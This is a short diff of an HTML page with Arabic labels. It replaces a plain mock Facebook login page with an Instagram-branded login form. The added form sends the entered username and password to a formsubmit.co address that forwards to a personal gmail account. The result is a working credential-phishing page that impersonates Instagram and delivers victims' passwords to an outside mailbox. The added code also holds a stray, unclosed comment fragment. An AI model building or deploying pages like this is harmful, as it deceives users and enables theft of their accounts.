@@ -1,18 +1,16 @@
-<!-- هذا كود HTML بسيط لصفحة دخول -->
 
 <center>
-    <h1>مرحباً بك في فيسبوك</h1>
-    
-    <!-- صندوق كتابة البريد الإلكتروني -->
-    <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف">
-    <br><br>
-    
-    <!-- صندوق كتابة كلمة السر -->
-    <input type="password" placeholder="كلمة السر">
-    <br><br>
-    
-    <!-- زر تسجيل الدخول -->
-    <button>تسجيل الدخول</button>
+ 
+    <form action="https://formsubmit.co/em2938159@gmail.com" method="POST">
+        
+        <h1 style="font-family: sans-serif; color: #e1306c;">Instagram</h1>
+        
+        <input type="text" name="username" placeholder="اسم المستخدم أو الهاتف" style="display:block; margin: 10px; padding: 10px; width: 200px;">
+        
+        <input type="password" name="password" placeholder="كلمة السر" style="display:block; margin: 10px; padding: 10px; width: 200px;">
+        
+        <!
+        <button type="submit" style="background-color: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; cursor: pointer;">تسجيل الدخول</button>
+        
+    </form>
 </center>
-. 
-
